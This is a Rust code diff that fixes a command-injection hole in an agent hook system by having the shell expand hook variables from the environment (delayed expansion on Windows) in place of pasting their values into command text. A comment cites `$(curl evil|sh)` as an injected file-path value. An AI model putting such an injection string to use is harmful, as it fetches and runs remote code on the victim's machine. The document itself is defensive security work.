@@ -3,7 +3,7 @@ use std::time::Duration;
 
 use serde::{Deserialize, Serialize};
 
-use crate::shell::shell_command_builder;
+use crate::shell::hook_shell_command_builder;
 
 /// Hook system configuration
 #[derive(Debug, Clone, Deserialize, Serialize)]
@@ -382,11 +382,25 @@ fn glob_match(pattern: &str, value: &str) -> bool {
         .unwrap_or(false)
 }
 
-/// Interpolate ${VAR} in a command string with provided env vars
-fn interpolate_command(command: &str, env_vars: &HashMap<String, String>) -> String {
+/// Translate the documented `${VAR}` hook syntax into the running shell's safe
+/// env-reference form. Variable VALUES are NEVER substituted into the command
+/// text — that allowed command injection via model-controlled tool inputs and
+/// outputs (e.g. a tool file path of `$(curl evil|sh)`). The shell expands the
+/// reference from the environment passed via `.envs`.
+///
+/// - Unix `sh`: `${VAR}` is already the native, safe reference — left as-is
+///   (parameter expansion does not re-evaluate the value for command
+///   substitution).
+/// - Windows `cmd`: rewritten to delayed-expansion `!VAR!`, expanded safely at
+///   execution time by [`hook_shell_command_builder`]'s `/V:ON`; plain `%VAR%`
+///   would be expanded at parse time and re-interpreted (unsafe).
+fn shellify_hook_vars(command: &str, env_vars: &HashMap<String, String>) -> String {
+    if !cfg!(windows) {
+        return command.to_string();
+    }
     let mut result = command.to_string();
-    for (key, value) in env_vars {
-        result = result.replace(&format!("${{{}}}", key), value);
+    for key in env_vars.keys() {
+        result = result.replace(&format!("${{{key}}}"), &format!("!{key}!"));
     }
     result
 }
@@ -401,11 +415,11 @@ async fn run_hook_command(
     env_vars: &HashMap<String, String>,
     timeout_ms: u64,
 ) -> Result<HookResult, HookError> {
-    let interpolated = interpolate_command(command, env_vars);
+    let command = shellify_hook_vars(command, env_vars);
     let timeout = Duration::from_millis(timeout_ms);
 
     let result = tokio::time::timeout(timeout, async {
-        shell_command_builder(&interpolated)
+        hook_shell_command_builder(&command)
             .envs(env_vars)
             .output()
             .await
